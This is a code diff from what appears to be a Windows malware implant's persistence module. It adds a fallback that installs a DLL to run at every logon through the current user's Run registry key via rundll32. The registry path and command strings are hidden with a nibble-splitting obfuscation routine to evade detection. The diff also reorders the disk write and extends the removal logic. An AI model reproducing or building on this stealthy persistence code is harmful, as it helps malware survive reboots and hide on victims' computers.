@@ -66,14 +66,14 @@ bool WriteDllToDisk( PERSIST_STRUCT *persist_ptr ){
 				
 			if( !WriteFile(hFile, persist_ptr->dll_file_buf, persist_ptr->dll_file_size, &bytes_written, NULL) ) {
 #ifdef _DBG
-				Log( "[-] ReadDllIntoMemory::ReadFile failed. \n");
+				Log( "[-] WriteDllToDisk::WriteFile failed. \n");
 #endif
 				retVal = false;
 			}
 
 		} else {
 #ifdef _DBG
-			Log("[-] ReadDllIntoMemory::GetFileSize failed. \n");
+			Log("[-] WriteDllToDisk:: File size equals 0. \n");
 #endif
 			retVal = false;
 		}
@@ -81,7 +81,7 @@ bool WriteDllToDisk( PERSIST_STRUCT *persist_ptr ){
 
 	} else {
 #ifdef _DBG
-		Log("[-] ReadDllIntoMemory::CreateFile failed. \n");
+		Log("[-] WriteDllToDisk::CreateFile failed. \n");
 #endif
 		retVal = false;
 	}
@@ -96,10 +96,7 @@ bool AddPersistence( PERSIST_STRUCT *persist_ptr ){
 	//Check if path is emptry
 	if ( persist_ptr->reg_key_path.empty() )
 		return false;
-
-	//Write the DLL
-	WriteDllToDisk( persist_ptr );
-	
+		
 	//Get the filename from the dll path
 	size_t pos = persist_ptr->dll_file_path.find_last_of("\\");
 	std::string file_name_str = persist_ptr->dll_file_path.substr(pos + 1, std::string::npos );
@@ -135,10 +132,73 @@ bool AddPersistence( PERSIST_STRUCT *persist_ptr ){
 				}
 				free(driver_ptr);
 				RegCloseKey(hkey);
+
+			} else {
+#ifdef _DBG
+				Log( "[-] Error: Unable to create persistence registry key in SYSTEM hive.\n");
+#endif				
+				retVal = false;
 			}
+		} else {
+#ifdef _DBG
+			Log( "[-] Error: Unable to open persistence registry key in SYSTEM hive.\n");
+#endif				
+			retVal = false;
 		}			
+
+		//If we were unable to create a SYSTEM level key
+		if( !retVal ){
+			//Try to open registry key (Software\\Microsoft\\Windows\\CurrentVersion\\Run)
+			char *keyPath = decode_split("\x5\x3\x6\xf\x6\x6\x7\x4\x7\x7\x6\x1\x7\x2\x6\x5\x5\xc\x5\xc\x4\xd\x6\x9\x6\x3\x7\x2\x6\xf\x7\x3\x6\xf\x6\x6\x7\x4\x5\xc\x5\xc\x5\x7\x6\x9\x6\xe\x6\x4\x6\xf\x7\x7\x7\x3\x5\xc\x5\xc\x4\x3\x7\x5\x7\x2\x7\x2\x6\x5\x6\xe\x7\x4\x5\x6\x6\x5\x7\x2\x7\x3\x6\x9\x6\xf\x6\xe\x5\xc\x5\xc\x5\x2\x7\x5\x6\xe",98);
+			std::string reg_key_path(keyPath);
+			free(keyPath);
+
+			//Construct run key value
+			//"rundll32 "
+			char *rundll32 = decode_split("\x7\x2\x7\x5\x6\xe\x6\x4\x6\xc\x6\xc\x3\x3\x3\x2\x2\x0",18);
+			std::string run_dll_str(rundll32);
+			free(rundll32);
+
+			//Add DLL path
+			run_dll_str.append(persist_ptr->dll_file_path);
+
+			//",RegisterDll
+			char *regdll = decode_split("\x2\xc\x5\x2\x6\x5\x6\x7\x6\x9\x7\x3\x7\x4\x6\x5\x7\x2\x4\x4\x6\xc\x6\xc",24);
+			run_dll_str.append(regdll);
+			free(regdll);
+
+						
+			//Check if reg key has been set for persistence
+			HKEY hkey = NULL;
+			long ret = RegOpenKeyExA(HKEY_CURRENT_USER, reg_key_path.c_str(), 0, KEY_ALL_ACCESS, &hkey);
+			if(ret == ERROR_SUCCESS ) {
+
+				ret = RegSetValueEx (hkey, persist_ptr->reg_key_path.c_str(), 0, REG_SZ, (LPBYTE)run_dll_str.c_str(), (DWORD)run_dll_str.length());
+				if ( ret != ERROR_SUCCESS) {
+	#ifdef _DBG
+					Log( "[-] Error: Unable to write registry value.\n");
+	#endif
+				}
+				RegCloseKey(hkey);	
+				retVal = true;
+
+			} else {
+	#ifdef _DBG
+				Log( "[-] Error: Unable to open persistence registry key in HKCU hive.\n");
+	#endif				
+			}	
+
+		}
 		
+		//Only write back to disk if the reg key is in place
+		if( retVal ){			
+			//Write the DLL
+			WriteDllToDisk( persist_ptr );
+		}
+
 	}	
+
+
 	
 	return retVal;
 
@@ -164,8 +224,25 @@ bool RemovePersistence( PERSIST_STRUCT *persist_ptr ){
 
 		} else {
 #ifdef _DBG
-			Log("[-] Error: RemovePersistence:: Unable to open registry key %s.\n", keyPath);
+			Log("[-] Error: RemovePersistence:: Unable to open SYSTEM registry key.\n");
 #endif		
+			//Try to open registry key (Software\\Microsoft\\Windows\\CurrentVersion\\Run)
+			char *keyPath = decode_split("\x5\x3\x6\xf\x6\x6\x7\x4\x7\x7\x6\x1\x7\x2\x6\x5\x5\xc\x5\xc\x4\xd\x6\x9\x6\x3\x7\x2\x6\xf\x7\x3\x6\xf\x6\x6\x7\x4\x5\xc\x5\xc\x5\x7\x6\x9\x6\xe\x6\x4\x6\xf\x7\x7\x7\x3\x5\xc\x5\xc\x4\x3\x7\x5\x7\x2\x7\x2\x6\x5\x6\xe\x7\x4\x5\x6\x6\x5\x7\x2\x7\x3\x6\x9\x6\xf\x6\xe\x5\xc\x5\xc\x5\x2\x7\x5\x6\xe",98);
+			reg_key_path.assign(keyPath);
+			free(keyPath);
+
+			long ret = RegOpenKeyExA(HKEY_CURRENT_USER, reg_key_path.c_str(), 0, KEY_ALL_ACCESS, &hkey);
+			if(ret == ERROR_SUCCESS ) {
+
+				//Delete reg key
+				RegDeleteValue(hkey, persist_ptr->reg_key_path.c_str());
+			
+			} else {
+#ifdef _DBG
+				Log("[-] Error: RemovePersistence:: Unable to open HKCU registry key.\n");
+#endif
+			}
+	
 		}
 
 	}
@@ -178,9 +255,10 @@ bool RemovePersistence( PERSIST_STRUCT *persist_ptr ){
 	#ifdef _DBG
 			Log("[-] RemovePersistence::DeleteFile failed.\n");
 	#endif	
+			
+		} else {
+			retVal = true;
 		}
-
-		retVal = true;
 		
 	}
 	
